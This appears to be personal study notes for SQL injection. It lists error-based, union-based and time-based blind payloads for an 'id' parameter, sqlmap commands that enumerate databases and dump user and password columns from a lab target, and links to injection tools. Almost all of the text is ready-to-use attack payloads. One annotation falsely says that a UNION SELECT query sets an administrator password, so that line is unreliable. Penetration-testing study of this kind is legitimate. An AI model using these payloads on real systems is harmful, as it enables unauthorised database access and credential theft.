Types:  
Error base, blind  
Example:  
`id='` > error in syntax (to see if there is responce)  
`id=''''`  
``id=/`/`` > without escape  
`id=[]=)`  
`id=1'`  
`id=1'+AND+1=1--+`  
`id='+UNION+SELECT+1--+`  
`id='+UNION+SELECT+1,2--+`  
`id='+UNION+SELECT+1,2,3--+`  
`id='+UNION+SELECT+1,2,3,4--+`  
`id='+UNION+SELECT+1,fakename,3--+`  
`id='+UNION+SELECT+1,2,title,3--+`  
`id='+UNION+SELECT+1,2,3,4 from fakename--+`  
`id='+UNION+SELECT+'123'+AS+password+from+admins+WHERE+'1'='1'` > set administrator password to 123  
`id=1'''' AND 1=1--` > true  
`id=1'''' AND 1=2--` > false  
`1' AND sleep(5)--` >delay  
`'; WAITFOR DELAY '0:0:5'--` > delay  
`id=1' (IF TRUE/VALID STATMENT) THEN SLEEP(5) SELECT SUBSTRING (string, start, value)`  
`id=1' AND substring(@@version,1,1)=5`

==SQLmap==
```sqlmap -u ""http://192.168.0.101/"" --cookie=""PHPSESSID=;security=low""``` > scan sql map (dwanvurlnapp) cookie from burp
```--dbs```  > list databases
```-D mysql --tables``` > check tables from specific database
```-C user,password --dump``` > dumping tables

Tools
polyglot sqli - https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Polyglots/SQLi-Polyglots.txt
commix - https://github.com/commixproject/commix
cmdi - https://githubhelp.com/Vladimir-Ivanov-Git/blind
https://owasp.org/www-community/attacks/Command_Injection

